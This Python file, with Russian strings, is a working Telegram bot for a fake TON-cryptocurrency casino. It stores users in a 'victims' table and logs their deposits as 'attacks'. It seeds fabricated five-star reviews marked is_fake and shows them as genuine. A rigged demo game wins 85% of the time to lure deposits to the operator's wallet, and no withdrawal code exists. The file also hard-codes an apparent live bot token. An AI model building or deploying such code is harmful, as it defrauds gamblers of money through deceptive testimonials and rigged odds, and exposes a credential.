# =================================================================
# X-GEN ANTI-DOTE v5.0 - RENDER EDITION (БЕСПЛАТНО, БЕЗ КАРТЫ)
# =================================================================
# Оптимизировано для Render.com Free Tier
# =================================================================

import asyncio
import logging
import sqlite3
import random
import hashlib
import json
import base64
import os
import requests
from datetime import datetime, timedelta
from flask import Flask, request

# Aiogram
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    WebAppInfo, MenuButtonWebApp, BotCommand,
    Message, CallbackQuery
)
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiohttp import web

# =================================================================
# КОНФИГУРАЦИЯ (ЗАПОЛНИ!)
# =================================================================
BOT_TOKEN = "8978316248:AAF4n6jG5gr4quppre6H1NB7U9LjEjnESqs"
ADMIN_ID = 7753887058
TON_WALLET = "12237ee2c684a00cd473582230a4d9efea8b51b6baf2322883e4ef52f5d34390"
TONCENTER_API_KEY = "ТВОЙ_API_КЛЮЧ"
WEBAPP_URL = "https://bot-eta-eosin.vercel.app/"
TONCENTER_URL = "https://toncenter.com/api/v2"

# Эти переменные Render даст автоматически
# RENDER_EXTERNAL_HOSTNAME - домен приложения
# PORT - порт

# =================================================================
# БАЗА ДАННЫХ
# =================================================================
DB_PATH = 'syndrome_victims.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.executescript('''
        CREATE TABLE IF NOT EXISTS victims (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            balance_ton REAL DEFAULT 0,
            total_deposited_ton REAL DEFAULT 0,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            referral_earnings REAL DEFAULT 0,
            last_activity TIMESTAMP,
            pending_payment_id TEXT,
            pending_payment_time TIMESTAMP,
            demo_wins INTEGER DEFAULT 0,
            demo_earnings REAL DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS attack_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            attack_type TEXT,
            amount REAL,
            currency TEXT,
            tx_hash TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS referrals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            referrer_id INTEGER,
            referred_id INTEGER,
            earnings_for_referrer REAL DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS reviews (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            review_text TEXT,
            rating INTEGER,
            amount_won REAL,
            is_fake BOOLEAN DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    ''')
    conn.commit()
    return conn

# =================================================================
# ФЕЙКОВЫЕ ОТЗЫВЫ
# =================================================================
FAKE_REVIEWS = [
    ("crypto_whale", "Вывел 150 TON без проблем! 🔥", 5, 150),
    ("lucky_gambler", "За неделю +340 TON! Спасибо!", 5, 340),
    ("ton_master", "Реферальная система бомба!", 5, 89),
    ("gambling_king", "VIP статус - выплаты мгновенные!", 5, 500),
    ("crypto_lady", "Лучшее казино 2024! 💎", 5, 230),
    ("ton_investor", "С 10 TON до 890! Невероятно!", 5, 890),
    ("lucky_ton", "Вывела 420 TON! Играю каждый день!", 5, 420),
]

def seed_reviews(conn):
    cursor = conn.cursor()
    for username, text, rating, amount in FAKE_REVIEWS:
        cursor.execute('''
            INSERT OR IGNORE INTO reviews (user_id, username, review_text, rating, amount_won, is_fake)
            VALUES (?, ?, ?, ?, ?, 1)
        ''', (random.randint(100000, 999999), username, text, rating, amount))
    conn.commit()

# =================================================================
# ФУНКЦИИ
# =================================================================

def generate_payment_id(user_id):
    timestamp = int(datetime.now().timestamp())
    raw = f"SYN{user_id}X{timestamp}X{random.randint(1000,9999)}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()

def generate_referral_code(user_id):
    raw = f"REF{user_id}{int(datetime.now().timestamp())}{random.randint(1000,9999)}"
    return hashlib.md5(raw.encode()).hexdigest()[:8].upper()

def get_or_create_ref_code(conn, user_id):
    cursor = conn.cursor()
    cursor.execute('SELECT referral_code FROM victims WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    if result and result[0]:
        return result[0]
    code = generate_referral_code(user_id)
    cursor.execute('UPDATE victims SET referral_code = ? WHERE user_id = ?', (code, user_id))
    conn.commit()
    return code

def decode_ton_comment(in_msg):
    comment = in_msg.get('message', '')
    if not comment:
        msg_data = in_msg.get('msg_data', {})
        body = msg_data.get('body', '')
        if body:
            try:
                decoded = base64.b64decode(body)
                if len(decoded) > 4:
                    comment = decoded[4:].decode('utf-8', errors='ignore')
            except:
                pass
    return comment.strip()

def verify_ton_transaction_sync(wallet_address, comment, hours=24):
    try:
        params = {'address': wallet_address, 'limit': 50, 'api_key': TONCENTER_API_KEY}
        response = requests.get(f"{TONCENTER_URL}/getTransactions", params=params, timeout=10)
        if response.status_code != 200:
            return None
        data = response.json()
        if not data.get('ok'):
            return None
        transactions = data.get('result', [])
        cutoff_time = datetime.now() - timedelta(hours=hours)
        for tx in transactions:
            in_msg = tx.get('in_msg', {})
            if not in_msg:
                continue
            source = in_msg.get('source', '')
            if source == wallet_address:
                continue
            value_ton = int(in_msg.get('value', 0)) / 1_000_000_000
            msg_comment = decode_ton_comment(in_msg)
            if comment.upper() in msg_comment.upper():
                tx_time = datetime.fromtimestamp(tx.get('utime', 0))
                if tx_time > cutoff_time:
                    return {
                        'hash': tx.get('hash', ''),
                        'from': source,
                        'amount': value_ton,
                        'time': tx_time.isoformat()
                    }
        return None
    except Exception as e:
        logging.error(f"TON error: {e}")
        return None

# =================================================================
# ИНИЦИАЛИЗАЦИЯ БОТА
# =================================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# =================================================================
# ОБРАБОТЧИКИ
# =================================================================

@dp.message(Command("start"))
async def start_command(message: Message):
    conn = init_db()
    cursor = conn.cursor()
    
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    args = message.text.split()
    referrer_code = args[1] if len(args) > 1 else None
    
    cursor.execute('INSERT OR IGNORE INTO victims (user_id, username, last_activity) VALUES (?, ?, CURRENT_TIMESTAMP)', (user_id, username))
    
    if referrer_code:
        cursor.execute('SELECT user_id FROM victims WHERE referral_code = ?', (referrer_code,))
        referrer = cursor.fetchone()
        if referrer and referrer[0] != user_id:
            cursor.execute('INSERT OR IGNORE INTO referrals (referrer_id, referred_id) VALUES (?, ?)', (referrer[0], user_id))
            cursor.execute('UPDATE victims SET referred_by = ? WHERE user_id = ?', (referrer[0], user_id))
    
    get_or_create_ref_code(conn, user_id)
    conn.commit()
    conn.close()
    
    keyboard = InlineKeyboardBuilder()
    keyboard.add(InlineKeyboardButton(text="🎰 ОТКРЫТЬ КАЗИНО", web_app=WebAppInfo(url=WEBAPP_URL)))
    keyboard.add(InlineKeyboardButton(text="🎁 БЕСПЛАТНАЯ ДЕМО-ИГРА", callback_data="demo_game"))
    keyboard.add(InlineKeyboardButton(text="💰 ПОПОЛНИТЬ TON", callback_data="deposit_ton"))
    keyboard.add(InlineKeyboardButton(text="👥 ПРИГЛАСИТЬ ДРУЗЕЙ", callback_data="referral_info"))
    keyboard.add(InlineKeyboardButton(text="⭐ ОТЗЫВЫ", callback_data="show_reviews"))
    keyboard.add(InlineKeyboardButton(text="💼 БАЛАНС", callback_data="check_balance"))
    keyboard.adjust(1)
    
    await message.answer(
        "🔥 *SYNDROME CASINO — TON-КАЗИНО В TELEGRAM!* 🔥\n\n"
        "🎰 *Слоты, Кости, Блэкджек*\n"
        "💎 *Мгновенные депозиты через TON*\n"
        "💰 *Мгновенные выплаты*\n"
        "👥 *20% от депозитов друзей*\n\n"
        "🎁 *НАЧНИ С БЕСПЛАТНОЙ ДЕМО-ИГРЫ!*",
        reply_markup=keyboard.as_markup()
    )

@dp.callback_query(F.data == "demo_game")
async def demo_game(callback: CallbackQuery):
    conn = init_db()
    cursor = conn.cursor()
    user_id = callback.from_user.id
    
    win = random.choices([True, False], weights=[85, 15])[0]
    bet = random.randint(10, 100)
    
    if win:
        multiplier = random.choices([2, 3, 5, 10], weights=[40, 30, 20, 10])[0]
        win_amount = bet * multiplier
        
        cursor.execute('UPDATE victims SET demo_wins = demo_wins + 1, demo_earnings = demo_earnings + ? WHERE user_id = ?', (win_amount, user_id))
        conn.commit()
        
        await callback.message.answer(
            f"🎉 *ДЕМО-ВЫИГРЫШ!* 🎉\n\n"
            f"Ставка: {bet} ⭐ (демо)\n"
            f"Множитель: x{multiplier}\n"
            f"Выигрыш: *{win_amount} ⭐*\n"
            f"Шанс: 85%\n\n"
            f"*🔥 ЭТО МОГЛО БЫТЬ РЕАЛЬНЫМ!*\n"
            f"Пополни баланс и забирай реальные TON!",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💰 ПОПОЛНИТЬ TON", callback_data="deposit_ton")],
                [InlineKeyboardButton(text="🎰 РЕАЛЬНАЯ ИГРА", web_app=WebAppInfo(url=WEBAPP_URL))],
                [InlineKeyboardButton(text="🔄 ЕЩЁ ДЕМО", callback_data="demo_game")]
            ])
        )
    else:
        await callback.message.answer(
            "😢 *НЕ ПОВЕЗЛО*\n\n"
            "Но в реальной игре шансы ВЫШЕ!",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎰 РЕАЛЬНАЯ ИГРА", web_app=WebAppInfo(url=WEBAPP_URL))],
                [InlineKeyboardButton(text="🔄 ЕЩЁ ДЕМО", callback_data="demo_game")]
            ])
        )
    
    conn.close()
    await callback.answer()

@dp.callback_query(F.data == "deposit_ton")
async def deposit_ton(callback: CallbackQuery):
    conn = init_db()
    cursor = conn.cursor()
    user_id = callback.from_user.id
    payment_id = generate_payment_id(user_id)
    
    cursor.execute('UPDATE victims SET pending_payment_id = ?, pending_payment_time = CURRENT_TIMESTAMP WHERE user_id = ?', (payment_id, user_id))
    conn.commit()
    conn.close()
    
    await callback.message.edit_text(
        "💎 *ПОПОЛНЕНИЕ ЧЕРЕЗ TON* 💎\n\n"
        f"Отправьте TON на кошелёк:\n\n"
        f"`{TON_WALLET}`\n\n"
        f"📝 *КОД В КОММЕНТАРИИ:*\n"
        f"`{payment_id}`\n\n"
        f"⚠️ БЕЗ КОДА НЕ ЗАЧТЕТСЯ!\n"
        f"Минимум: 0.1 TON\n\n"
        f"Затем нажмите проверку.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ ПРОВЕРИТЬ", callback_data=f"checkpay_{payment_id}")],
            [InlineKeyboardButton(text="🔄 НОВЫЙ КОД", callback_data="deposit_ton")],
            [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("checkpay_"))
async def check_payment(callback: CallbackQuery):
    payment_id = callback.data.replace("checkpay_", "")
    user_id = callback.from_user.id
    
    await callback.message.edit_text("🔍 Проверяю в блокчейне TON...")
    
    result = verify_ton_transaction_sync(TON_WALLET, payment_id, 24)
    
    if result:
        conn = init_db()
        cursor = conn.cursor()
        amount_ton = result['amount']
        
        cursor.execute('UPDATE victims SET balance_ton = balance_ton + ?, total_deposited_ton = total_deposited_ton + ?, pending_payment_id = NULL WHERE user_id = ?', (amount_ton, amount_ton, user_id))
        
        cursor.execute('INSERT INTO attack_log (user_id, attack_type, amount, currency, tx_hash) VALUES (?, "ton_deposit", ?, "TON", ?)', (user_id, amount_ton, result['hash'][:20]))
        
        cursor.execute('SELECT referred_by FROM victims WHERE user_id = ?', (user_id,))
        referrer = cursor.fetchone()
        if referrer and referrer[0]:
            bonus = amount_ton * 0.20
            cursor.execute('UPDATE victims SET referral_earnings = referral_earnings + ? WHERE user_id = ?', (bonus, referrer[0]))
        
        conn.commit()
        conn.close()
        
        await bot.send_message(ADMIN_ID, f"💰 Платеж: {amount_ton:.4f} TON от @{callback.from_user.username or 'Unknown'}")
        
        await callback.message.edit_text(
            f"✅ *ПЛАТЕЖ ПОДТВЕРЖДЕН!*\n\n"
            f"Зачислено: *{amount_ton:.4f} TON*\n\n"
            f"Теперь играйте на реальные TON!",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎰 ИГРАТЬ", web_app=WebAppInfo(url=WEBAPP_URL))],
                [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
            ])
        )
    else:
        await callback.message.edit_text(
            "❌ *ПЛАТЕЖ НЕ НАЙДЕН*\n\nПроверьте что вы отправили TON с кодом и попробуйте снова.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 ПРОВЕРИТЬ СНОВА", callback_data=f"checkpay_{payment_id}")],
                [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
            ])
        )
    
    await callback.answer()

@dp.callback_query(F.data == "referral_info")
async def referral_info(callback: CallbackQuery):
    conn = init_db()
    cursor = conn.cursor()
    user_id = callback.from_user.id
    code = get_or_create_ref_code(conn, user_id)
    
    cursor.execute('SELECT COUNT(*), COALESCE(SUM(earnings_for_referrer), 0) FROM referrals WHERE referrer_id = ?', (user_id,))
    ref_count, ref_earnings = cursor.fetchone()
    conn.close()
    
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start={code}"
    
    await callback.message.edit_text(
        "👥 *РЕФЕРАЛЬНАЯ ПРОГРАММА*\n\n"
        "20% от депозитов друзей!\n\n"
        f"👤 Приглашено: *{ref_count}*\n"
        f"💰 Заработано: *{ref_earnings:.2f} TON*\n\n"
        f"🔗 Ссылка:\n`{ref_link}`\n\n"
        f"📋 Код: `{code}`",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📤 ПОДЕЛИТЬСЯ", switch_inline_query=code)],
            [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "show_reviews")
async def show_reviews(callback: CallbackQuery):
    conn = init_db()
    cursor = conn.cursor()
    cursor.execute('SELECT username, review_text, rating, amount_won FROM reviews ORDER BY created_at DESC LIMIT 5')
    reviews = cursor.fetchall()
    conn.close()
    
    text = "⭐ *ОТЗЫВЫ* ⭐\n\n"
    for username, review, rating, amount in reviews:
        stars = "⭐" * rating
        text += f"*@{username}* {stars}\n_{review}_\n💰 Выиграл: *{amount} TON*\n\n"
    
    text += "🔥 *Присоединяйся!*"
    
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎰 ИГРАТЬ", web_app=WebAppInfo(url=WEBAPP_URL))],
        [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
    ]))
    await callback.answer()

@dp.callback_query(F.data == "check_balance")
async def check_balance(callback: CallbackQuery):
    conn = init_db()
    cursor = conn.cursor()
    user_id = callback.from_user.id
    cursor.execute('SELECT balance_ton, total_deposited_ton, referral_earnings FROM victims WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if result:
        balance, deposited, ref_earn = result
        await callback.message.edit_text(
            f"💼 *БАЛАНС*\n\n"
            f"💰 Доступно: *{balance:.4f} TON*\n"
            f"💎 Пополнено: *{deposited:.2f} TON*\n"
            f"👥 Рефералы: *{ref_earn:.2f} TON*",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎰 ИГРАТЬ", web_app=WebAppInfo(url=WEBAPP_URL))],
                [InlineKeyboardButton(text="💰 ПОПОЛНИТЬ", callback_data="deposit_ton")],
                [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
            ])
        )
    await callback.answer()

@dp.callback_query(F.data == "main_menu")
async def main_menu(callback: CallbackQuery):
    keyboard = InlineKeyboardBuilder()
    keyboard.add(InlineKeyboardButton(text="🎰 ОТКРЫТЬ КАЗИНО", web_app=WebAppInfo(url=WEBAPP_URL)))
    keyboard.add(InlineKeyboardButton(text="🎁 ДЕМО-ИГРА", callback_data="demo_game"))
    keyboard.add(InlineKeyboardButton(text="💰 ПОПОЛНИТЬ", callback_data="deposit_ton"))
    keyboard.add(InlineKeyboardButton(text="👥 ДРУЗЬЯ", callback_data="referral_info"))
    keyboard.add(InlineKeyboardButton(text="⭐ ОТЗЫВЫ", callback_data="show_reviews"))
    keyboard.add(InlineKeyboardButton(text="💼 БАЛАНС", callback_data="check_balance"))
    keyboard.adjust(1)
    
    await callback.message.edit_text("🎰 *SYNDROME CASINO — МЕНЮ*", reply_markup=keyboard.as_markup())
    await callback.answer()

@dp.message(Command("admin"))
async def admin_command(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        params = {'address': TON_WALLET, 'api_key': TONCENTER_API_KEY}
        response = requests.get(f"{TONCENTER_URL}/getAddressBalance", params=params, timeout=5)
        balance = int(response.json().get('result', 0)) / 1_000_000_000 if response.json().get('ok') else 0
    except:
        balance = 0
    
    conn = init_db()
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*), COALESCE(SUM(total_deposited_ton), 0) FROM victims')
    total_victims, total_deposits = cursor.fetchone()
    conn.close()
    
    await message.answer(
        f"👑 *АДМИН-ПАНЕЛЬ*\n\n"
        f"🏦 Кошелёк: *{balance:.4f} TON*\n"
        f"👥 Жертв: *{total_victims}*\n"
        f"💎 Депозитов: *{total_deposits:.2f} TON*"
    )

# =================================================================
# FLASK + WEBHOOK ДЛЯ RENDER
# =================================================================
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "Syndrome Casino Bot is running! 🎰"

@flask_app.route('/webhook', methods=['POST'])
def webhook():
    if request.method == 'POST':
        update = request.get_json()
        try:
            asyncio.run_coroutine_threadsafe(
                dp.feed_raw_update(update),
                loop
            )
        except:
            pass
        return 'ok', 200
    return 'error', 400

# =================================================================
# ЗАПУСК
# =================================================================
loop = None

async def setup_webhook():
    render_url = os.environ.get('RENDER_EXTERNAL_HOSTNAME', '')
    webhook_url = f"https://{render_url}/webhook"
    await bot.set_webhook(url=webhook_url, drop_pending_updates=True)
    print(f"✅ Webhook: {webhook_url}")

async def setup_menu():
    await bot.set_chat_menu_button(menu_button=MenuButtonWebApp(text="🎰 ИГРАТЬ", web_app=WebAppInfo(url=WEBAPP_URL)))
    commands = [BotCommand(command="start", description="🚀 Меню"), BotCommand(command="admin", description="👑 Админ")]
    await bot.set_my_commands(commands)

async def main():
    global loop
    loop = asyncio.get_event_loop()
    
    conn = init_db()
    seed_reviews(conn)
    conn.close()
    print("✅ База готова")
    
    await setup_webhook()
    await setup_menu()
    
    print("🔥 SYNDROME CASINO АКТИВЕН!")
    print(f"🌐 Сеть: MAINNET")
    print(f"👑 Админ ID: {ADMIN_ID}")

if __name__ == "__main__":
    asyncio.run(main())
    flask_app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
